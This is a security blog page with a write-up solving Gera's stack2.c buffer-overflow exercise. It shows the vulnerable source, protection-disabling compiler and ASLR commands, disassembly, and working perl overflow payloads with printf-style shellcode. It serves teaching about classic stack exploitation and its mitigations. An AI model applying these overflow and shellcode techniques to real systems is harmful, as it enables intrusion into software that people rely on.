<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <meta name="author" content="7h3rAm"/>
    <meta name="description" content="Personal Weblog"/>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <title>Grey Matter</title>

    <link href="/static/css/default.css" rel="stylesheet" type="text/css">
    <link href="/static/css/codehilite/perldoc.css" rel="stylesheet" type="text/css">

    <link href="/static/images/favicon-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
  </head>
  <body>
    <section id="content" class="body">
              <div class="header">
          <table>
            <tr>
              <td class="blogtitle"><a href="/" style="color: rgb(102, 102, 102);">Grey Matter</a></td>
              <td class="blognavbar">
                [<a id="archive" href="/archive.html" style="color: rgb(70, 130, 180);">Archive</a>] [<a id="tags" href="/tags.html" style="color: rgb(255, 183, 69);">Tags</a>] [<a id="projects" href="/projects.html" style="color: rgb(0, 128, 128);">Projects</a>] [<a id="research" href="/research.html" style="color: rgb(242, 119, 122);">Research</a>]
              </td>
            </tr>
          </table>
        </div>
                  <article class="post">
  <div class="row">
    <div class="col-lg-12">
      <div class="panel panel-default section compact">
        <div class="body">
          <p class="heading">Gera's Warming Up on Stack #2 - Solutions</p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <p class="date">
                  <a href="/2012/tfm-mmplayer-ppl-seh.html">&lt&lt;</a> published on 02/Jan/2013<a href="/2013/geras-wuos-stack3-solutions.html"> &gt;&gt;</i></a><br/>
                </p>
                                                                                                                                                                                                                                                                                                                                                                                                            <div class="post-content">
          <p>Following is the part 2 in the series of posts I started back in August
2012 with an aim to provide an analysis and possible solutions for the
vulnerable programs provided by
<a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=researcher&amp;name=Gerardo_Richarte">Gera</a>
at his <a href="http://community.corest.com/%7Egera/InsecureProgramming/">Insecure
Programming</a>
by example page.</p>

<p>This post follows the <a href="/2012/8/27/geras-wuos-stack1-solutions/">Gera&#8217;s Warming Up on Stack #1 -
Solutions</a> post and if you have
not read it, I request you to please do so. Most of the concepts are
very similar and since they have been already talked about, I&#8217;ll not be
reiterating them here.</p>

<p>Let&#8217;s get started. Below is the source for the vulnerable
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a>
program:</p>

<div class="codehilite"><pre><span></span><code><span class="cm">/* stack2.c                                     *</span>
<span class="cm"> * specially crafted to feed your brain by gera */</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">cookie</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %08x cookie: %08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="mh">0x01020305</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you win!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>Like its counterpart
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>,
the above program too accepts user-input through the <code>gets</code> function and
then looks for a specific value in a local variable named <code>cookie</code>. If
this value is equal to a certain pre-defined constant, <code>printf</code> function
is used to show a <code>you win!</code> message to the user. There is no direct
means of modifying the content of the <code>cookie</code> variable. The <code>gets</code>
function will keep reading from the stdin device until it encounters a
newline or EoF character. Since this reading loop fails to honor the
size of the destination buffer, a classic buffer overflow vulnerability
is introduced in the program. Our aim is to leverage this vulnerability
and exploit this program so that it prints the <code>you win!</code> message to
stdout.</p>

<p>Here are a few observations that could be made by looking at the source
of the program:</p>

<ol>
<li>Since it is defined prior to <code>buf</code>, the <code>cookie</code> would be placed at
a higher memory address on the program stack, just below the saved
registers from the function prologue</li>
<li>The <code>buf</code> character array would be at an offset of at least 80B from
<code>cookie</code></li>
<li>The <code>gets</code> call would accept unbounded user-input within <code>buf</code> array
and hence it provides a mechanism to alter the call stack contents</li>
</ol>

<p>Stack layout for
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a>
is identical to
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>
as already outlined in the <a href="/2012/8/27/geras-wuos-stack1-solutions/">Gera&#8217;s Warming Up on Stack #1 -
Solutions</a> post.</p>

<p>Here are solutions I could think of to get the <code>you win!</code> message
printed:</p>

<ul>
<li>Solution #1: Overflow the internal <code>buf</code> array to overwrite
<code>cookie</code> with 0x01020305</li>
<li>Solution #2: Overflow the internal <code>buf</code> array to overwrite EIP
with the address of <code>printf(you win!)</code></li>
<li>Solution #3: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and
overwrite EIP with its address</li>
<li>Solution #4: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode
through an environment var and overwrite EIP with its address</li>
</ul>

<p>Here&#8217;s a brief description of the test system:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># cat /etc/lsb-release | grep DESC ; uname -a | cut -d&#39; &#39; -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E &#39;(vendor|model|flags)&#39;</span>
<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span>*Ubuntu <span class="m">10</span>.04.2 LTS*
Linux <span class="m">2</span>.6.38 i686 GNU/Linux
gcc <span class="o">(</span>Ubuntu <span class="m">4</span>.4.3-4ubuntu5<span class="o">)</span> <span class="m">4</span>.4.3
vendor_id   : GenuineIntel
model       : <span class="m">37</span>
model name  : Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i3 CPU       M <span class="m">350</span>  @ <span class="m">2</span>.27GHz
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc up pni monitor ssse3 lahf_l
</code></pre></div>

<h2>Solution #1: Overflow the internal buf array to overwrite cookie with 0x01020305</h2>

<p>Here&#8217;s the GCC commandline to prepare
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a>
for this solution:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack2 stack2.c</span>
stack2.c: In <span class="k">function</span> ‘main’:
stack2.c:8: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
stack2.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span><span class="m">80</span><span class="o">]</span>’
stack2.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">3</span> has <span class="nb">type</span> ‘int *’
/tmp/ccoBRXbD.o: In <span class="k">function</span> <span class="sb">`</span>main<span class="s1">&#39;:</span>
<span class="s1">stack2.c:(.text+0x27): warning: the `gets&#39;</span> <span class="k">function</span> is dangerous and should not be used.
</code></pre></div>

<p>All done, let&#8217;s exploit
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a>:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x80 . &quot;\x05\x03\x02\x01&quot;&#39; | ./stack2</span>
buf: bffff4c4 cookie: bffff514
you win!
</code></pre></div>

<h2>Solution #2: Overflow the internal buf array to overwrite EIP with the address of printf(you win!)</h2>

<p>We need to have a look at the assembly of
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a>
and find out the location of the <code>printf</code> function which displays the
<code>you win!</code> message:</p>

<div class="codehilite"><pre><span></span><code><span class="cp"># objdump -d -M intel stack2 | grep -A20 main.:</span>
<span class="mh">08048444</span> <span class="p">&lt;</span><span class="nf">main</span><span class="p">&gt;:</span>
 <span class="mi">8048444</span><span class="o">:</span>   <span class="mi">55</span>                      <span class="n">push</span>   <span class="n">ebp</span>
 <span class="mi">8048445</span><span class="o">:</span>   <span class="mi">89</span> <span class="n">e5</span>                   <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
 <span class="mi">8048447</span><span class="o">:</span>   <span class="mi">83</span> <span class="n">ec</span> <span class="mi">60</span>                <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x60</span>
 <span class="mi">804844</span><span class="nl">a</span><span class="p">:</span>   <span class="mi">8</span><span class="n">d</span> <span class="mi">45</span> <span class="n">fc</span>                <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
 <span class="mi">804844</span><span class="nl">d</span><span class="p">:</span>   <span class="mi">89</span> <span class="mi">44</span> <span class="mi">24</span> <span class="mi">08</span>             <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">eax</span>
 <span class="mi">8048451</span><span class="o">:</span>   <span class="mi">8</span><span class="n">d</span> <span class="mi">45</span> <span class="n">ac</span>                <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
 <span class="mi">8048454</span><span class="o">:</span>   <span class="mi">89</span> <span class="mi">44</span> <span class="mi">24</span> <span class="mo">04</span>             <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
 <span class="mi">8048458</span><span class="o">:</span>   <span class="n">c7</span> <span class="mo">04</span> <span class="mi">24</span> <span class="mi">50</span> <span class="mi">85</span> <span class="mo">04</span> <span class="mi">08</span>    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8048550</span>
 <span class="mf">804845f</span><span class="o">:</span>   <span class="n">e8</span> <span class="mi">0</span><span class="n">c</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="mi">8048370</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
 <span class="mi">8048464</span><span class="o">:</span>   <span class="mi">8</span><span class="n">d</span> <span class="mi">45</span> <span class="n">ac</span>                <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
 <span class="mi">8048467</span><span class="o">:</span>   <span class="mi">89</span> <span class="mo">04</span> <span class="mi">24</span>                <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
 <span class="mi">804846</span><span class="nl">a</span><span class="p">:</span>   <span class="n">e8</span> <span class="n">e1</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="mi">8048350</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
 <span class="mf">804846f</span><span class="o">:</span>   <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">fc</span>                <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
 <span class="mi">8048472</span><span class="o">:</span>   <span class="mi">3</span><span class="n">d</span> <span class="mo">05</span> <span class="mo">03</span> <span class="mo">02</span> <span class="mo">01</span>          <span class="n">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x1020305</span>
 <span class="mi">8048477</span><span class="o">:</span>   <span class="mi">75</span> <span class="mi">0</span><span class="n">c</span>                   <span class="n">jne</span>    <span class="mi">8048485</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0x41</span><span class="o">&gt;</span>
 <span class="mi">8048479</span><span class="o">:</span>   <span class="n">c7</span> <span class="mo">04</span> <span class="mi">24</span> <span class="mi">68</span> <span class="mi">85</span> <span class="mo">04</span> <span class="mi">08</span>    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8048568</span>
 <span class="mi">8048480</span><span class="o">:</span>   <span class="n">e8</span> <span class="n">fb</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="mi">8048380</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
 <span class="mi">8048485</span><span class="o">:</span>   <span class="n">c9</span>                      <span class="n">leave</span>
 <span class="mi">8048486</span><span class="o">:</span>   <span class="n">c3</span>                      <span class="n">ret</span>
 <span class="mi">8048487</span><span class="o">:</span>   <span class="mi">90</span>                      <span class="n">nop</span>
</code></pre></div>

<p>The address turns out to be 0x8048479. Let&#8217;s try exploiting:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;&#39; | ./stack2</span>
buf: bffff4c4 cookie: bffff514
you win!
Segmentation fault
</code></pre></div>

<h2>Solution #3: Inject a NOP-prefixed printf(you win!) shellcode and overwrite EIP with its address</h2>

<p>Let&#8217;s first recompile
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a>
and request GCC to mark program stack as executable. Additionally, we
also need to turn ASLR off so that we can have a static return address
to overwrite EIP with:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack2 stack2.c 2&gt;/dev/null ; readelf -l stack2 | grep GNU_STACK</span>
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
<span class="c1">#</span>
<span class="c1"># echo 0 &gt;/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space</span>
<span class="m">0</span>
</code></pre></div>

<p>Now lets go ahead with exploitation. The Null-free, NOP-prefixed
printf(<code>you win!</code>) shellcode we used to exploit
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>
in the <a href="/2012/8/27/geras-wuos-stack1-solutions/">Gera&#8217;s Warming Up on Stack #1 -
Solutions</a> post could be reused
here:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># ./stack2</span>
buf: bffff4c4 cookie: bffff514
<span class="c1">#</span>
<span class="c1"># ./stack2</span>
buf: bffff4c4 cookie: bffff514
<span class="c1">#</span>
<span class="c1"># perl -e &#39;print &quot;\x90&quot;x51 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21&quot; . &quot;\xc4\xf4\xff\xbf&quot;&#39; | ./stack2</span>
buf: bffff4c4 cookie: bffff514
you win!#
</code></pre></div>

<h2>Solution #4: Inject a NOP-prefixed printf(you win!) shellcode through an environment var and overwrite EIP with its address</h2>

<p>Lets get straight to exploitation:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># echo $WINCODE | hexdump -C</span>
<span class="m">00000000</span>  eb <span class="m">16</span> <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> d2  b0 <span class="m">04</span> b3 <span class="m">01</span> <span class="m">59</span> b2 <span class="m">20</span> <span class="nb">cd</span>  <span class="p">|</span>..1.1.1.....Y. .<span class="p">|</span>
<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
<span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> <span class="m">20</span> 0d 0a                           <span class="p">|</span> win! ..<span class="p">|</span>
<span class="m">00000028</span>
<span class="c1">#</span>
<span class="c1"># ./getenvaddr WINCODE ./stack2</span>
<span class="o">[</span>+<span class="o">]</span> WINCODE: 0xbffff726
<span class="c1">#</span>
<span class="c1"># perl -e &#39;print &quot;\x90&quot;x88 . &quot;\x26\xf7\xff\xbf&quot;&#39; | ./stack2</span>
buf: bffff4c4 cookie: bffff514
you win!
</code></pre></div>

<p>So, we have now successfully exploited the
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a>
program through four different techniques. Depending on the motive of
your exploitation attempt, other techniques could be devised and some,
mentioned here, be rejected.</p>

<p>Like I said, earlier, these solutions are not practical anymore. They
just serve the purpose of understanding how exploits used to work before
mitigation features were introduced in modern systems. But, as with
everything else, understanding basics is really important. As mitigation
features mature, exploitation techniques become increasingly complex.
And to understand those, we need to build upon the solid foundation of
basic concepts, like those discussed on this and other blogs.</p>

        </div>
        <div class="meta">
          <hr/>
          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank">twitter</a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank">issue</a> on blog repository.</p>
          <hr/>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <table>
                <tr>
                  <td align="left">(share via <a href="mailto:?subject=Gera's Warming Up on Stack #2 - Solutions&body=http://7h3ram.github.io//2013/geras-wuos-stack2-solutions.html" target="_blank" title="Share via Email">mail</a>, <a href="http://twitter.com/intent/tweet?text=Gera's Warming Up on Stack #2 - Solutions+http://7h3ram.github.io//2013/geras-wuos-stack2-solutions.html&via=7h3rAm" target="_blank" title="Share on Twitter">twitter</a>, <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=http://7h3ram.github.io//2013/geras-wuos-stack2-solutions.html&p[images][0]=&p[title]=Gera's Warming Up on Stack #2 - Solutions&p[summary]=Solutions for Gera's Warming up on Stack #2 program." target="_blank" title="Share on Facebook">facebook</a> or <a href="https://plus.google.com/share?url=http://7h3ram.github.io//2013/geras-wuos-stack2-solutions.html" target="_blank" title="Share on Google Plus">google-plus</a>)</td>
                  <td align="right">(tagged <a href=/tags.html#buffer_overflow>buffer_overflow</a>, <a href=/tags.html#exploit>exploit</a>, <a href=/tags.html#mitigations>mitigations</a> and <a href=/tags.html#writeups>writeups</a>)</td>
                </tr>
                <tr>
                                      <td align="left"><a href="/2012/tfm-mmplayer-ppl-seh.html">&lt;&lt; TFM MMPlayer .ppl File Parsing SEH Overflow &lt;&lt;</a></td>
                    <td align="right"><a href="/2013/geras-wuos-stack3-solutions.html">&gt;&gt; Gera's Warming Up on Stack #3 - Solutions &gt;&gt;</a></td>
                                  </tr>
              </table>
                                                                                                                                                                                                                                                                                                                                                                                                </div>
        </div>
      </div>
    </div>
  </div>
  </article>
              <div class="footer">
          <center>
            <a href="/rss.xml" target="_blank">rss</a> | <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">license</a>
          </center>
        </div>
          </section>

    <script type="text/javascript">
      document.addEventListener("DOMContentLoaded", function() {
        var colors = ["#4B0082", "#3CB371", "#2E8B57", "#808000", "#20B2AA", "#008B8B", "#4682B4", "#B0C4DE", "#87CEFA", "#87CEEB", "#1E90FF", "#6495ED", "#000080", "#191970"];
        document.getElementById("element").style.color = colors[Math.floor(Math.random() * colors.length)];
      }, false);
    </script>

  </body>
</html>